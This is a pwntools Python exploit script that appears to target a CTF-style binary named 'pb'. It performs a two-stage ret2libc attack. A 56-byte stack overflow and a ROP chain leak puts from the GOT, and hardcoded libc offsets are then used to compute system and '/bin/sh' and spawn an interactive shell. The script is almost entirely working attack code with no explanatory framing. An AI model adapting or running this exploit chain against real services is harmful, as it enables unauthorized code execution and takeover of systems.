
from pwn import *
from time import sleep
import sys 


# IP   = '104.248.169.117' 
# PORT = 31796
#r    = remote(IP, PORT)

r =gdb.debug('./pb', '''

	c
''')


exe = './pb'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'
rop = ROP(elf)








rop.raw("A" * 56) # paddding
rop.raw(0x000000000040142b) # pop rdi
rop.raw(0x00403fa0) # got_put
rop.raw(0x00401030) # plt_put
rop.raw(0x0000000000401016) #ret for stack aligment
rop.raw(0x00000000004013be) #adress in main that does not result in SIGEV

#wait for first read and select option 2
r.recvuntil(b">>") 
r.sendline(b'2')
#wait for second read and send payload
r.recvuntil(b'Insert location of the library: ')
r.sendline(rop.chain())
#reading unimportant bytes
r.recvuntil(b'!\x0a\x0a')
#reading leaked address 
leak = unpack(r.recv()[:6].ljust(8, b"\x00"))

print("Leaked puts:" + str(hex(leak)))
rop2 = ROP(elf)
# second part - use leaked address to preform ret2libc
libc_puts = 0x080ed0 
libc_sys  = 0x050d60
libc_sh = 0x1d8698

offset = leak - libc_puts
sys = offset + libc_sys
sh = offset + libc_sh

log.info("Going again:\n")
rop2.raw("A" * 56)
rop2.raw(0x000000000040142b) #pop rdi
rop2.raw(sh) # addres of bin/sh
rop2.raw(0x0000000000401016) #ret stack alligment
rop2.raw(sys)# adress of system


#selecting option 2
r.send(b'2')
r.recvuntil(b'Insert location of the library: ')
#sending payload
r.sendline(rop2.chain())
#SHELL!
r.interactive()
